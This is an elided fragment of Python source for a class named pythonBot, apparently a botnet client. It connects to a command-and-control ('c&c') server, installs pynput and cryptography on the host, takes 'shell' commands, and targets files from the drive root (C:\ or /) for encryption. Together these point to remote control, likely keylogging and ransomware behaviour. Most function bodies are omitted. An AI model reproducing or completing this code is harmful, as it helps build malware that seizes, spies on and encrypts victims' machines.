...
class pythonBot:
    ...
    def __init__(self, addr, port):        
        ...
        self.port = port
        self.encr = False
        self.hostEmailPassword = "PASSWORD"
    ...
    def run(self):
        ...
        while not connected: 
            try:
                ...
                print(f'[**] connecting to c&c server in {ran} seconds')
                time.sleep(ran)
    ...
    def module_status(self, client_sock):
        ...
        try:
            ...
            try:
                pynputOK = 'pip'
                if windows:
                    output = execute('py -m pip install pynput')
                else:
        ...
        try:
            ...
            try:
                cryptographyOK = 'pip'
                if windows:
                    output = execute('py -m pip install cryptography')
                else:                
    ...
    def handle(self, client_socket):
        ...
        while True:
            ...
            if req == botOptions.shell:
                ...
                if platform == 'win32':
                    print("[II] windows os detected")
                    encrPath = 'C:\\'
                    print(f"[II] searching for files in {encrPath}")
                else:
                    encrPath = '/'
